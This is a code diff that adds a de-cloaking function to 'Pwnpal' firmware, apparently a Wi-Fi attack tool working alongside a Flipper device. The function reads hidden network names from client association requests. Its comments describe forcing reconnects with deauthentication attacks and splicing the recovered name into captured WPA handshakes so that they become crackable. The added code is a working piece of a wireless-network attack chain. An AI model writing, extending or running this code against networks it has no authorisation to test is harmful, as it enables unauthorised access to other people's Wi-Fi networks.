@@ -1093,6 +1093,46 @@ bool Pwnpal::reportAP(const uint8_t* payload, int length, int rssi, int channel,
     return true;
 }
 
+// De-cloak: a client's (re)association request to a HIDDEN AP names the ESSID in the clear.
+// We already deauth clients (forcing reconnects); this harvests the ESSID a reconnect reveals
+// and adopts it. Emitting PWNPAL_AP makes the Flipper adopt the name and splice an ESSID beacon
+// into an already-captured handshake pcap -> a hidden-AP capture becomes crackable.
+// assoc-req = mgmt subtype 0x00, reassoc-req = 0x20; both are directed AT the AP, so Addr1=BSSID.
+void Pwnpal::reportDecloak(const uint8_t* payload, int length, int rssi, int channel,
+                           bool has_fix, double lat, double lon) {
+    if (length < 30) return;
+    uint8_t sub = payload[0] & 0xf0;
+    int ie;
+    if (sub == 0x00)      ie = 28;   // assoc-req:   24 hdr + capability(2) + listen interval(2)
+    else if (sub == 0x20) ie = 34;   // reassoc-req: + current-AP address(6)
+    else return;
+    if (ie + 2 > length || payload[ie] != 0x00) return;   // SSID must be the first tagged param
+    int slen = payload[ie + 1];
+    if (slen <= 0 || slen > 32 || ie + 2 + slen > length) return;  // len 0 = still cloaked
+    const uint8_t* bssid = payload + 4;                    // Addr1 = the AP being (re)joined
+    int ri = reconIndex(bssid);
+    if (ri < 0 || _recon[ri].ssid[0] != '\0') return;     // unknown AP, or already named
+    char raw[33], ssid[33];
+    memcpy(raw, payload + ie + 2, slen);
+    raw[slen] = '\0';
+    sanitize(raw, ssid, sizeof(ssid));
+    if (!ssid[0]) return;
+    strncpy(_recon[ri].ssid, ssid, sizeof(_recon[ri].ssid) - 1);
+    _recon[ri].ssid[sizeof(_recon[ri].ssid) - 1] = '\0';
+    has_fix = geoResolve(has_fix, &lat, &lon);
+    char mac[18];
+    fmt_mac(mac, bssid);
+    char geo[48];
+    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
+    char line[256];
+    int n = snprintf(line, sizeof(line),
+        "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s}\n",
+        mac, ssid, channel, rssi, geo);
+    if (n > 0)
+        Serial.write((const uint8_t*)line,
+                     (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
+}
+
 bool Pwnpal::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
                                 bool has_fix, double lat, double lon) {
     // EAPOL 0x888e at [30..31], or [32..33] with a 2-byte QoS control.
